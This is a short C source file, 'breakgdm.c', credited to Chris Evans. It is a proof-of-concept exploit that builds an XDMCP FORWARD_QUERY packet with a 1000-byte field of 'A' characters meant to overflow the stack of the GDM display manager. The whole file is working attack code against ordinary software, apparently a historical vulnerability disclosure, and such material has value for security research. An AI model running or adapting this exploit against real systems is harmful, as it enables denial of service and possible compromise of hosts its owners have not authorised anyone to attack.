/*    
 * breakgdm.c - Chris Evans
 */
   
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>

int
main(int argc, const char* argv[])
{
  char deathbuf[1000];
  unsigned short s;   
  unsigned char c;    
  
  memset(deathbuf, 'A', sizeof(deathbuf));
  
  /* Write the Xdmcp header */
  /* Version */
  s = htons(1);
  write(1, &s, 2);
  /* Opcode: FORWARD_QUERY */
  s = htons(4);
  write(1, &s, 2);
  /* Length */    
  s = htons(1 + 2 + 1000 + 2);
  write(1, &s, 2);
  
  /* Now we're into FORWARD_QUERY which consists of
   * remote display, remote port, auth info. Remote display is binary
   * IP address data....
   */
  /* Remote display: 1000 A's which incidentally smoke a path
   * right to the stack
   */
  s = htons(sizeof(deathbuf));
  write(1, &s, 2);
  write(1, deathbuf, sizeof(deathbuf));
  /* Display port.. empty data will do */
  s = htons(0);
  write(1, &s, 2);
  /* Auth list.. empty data will do */
  c = 0;
  write(1, &c, 1);
} 
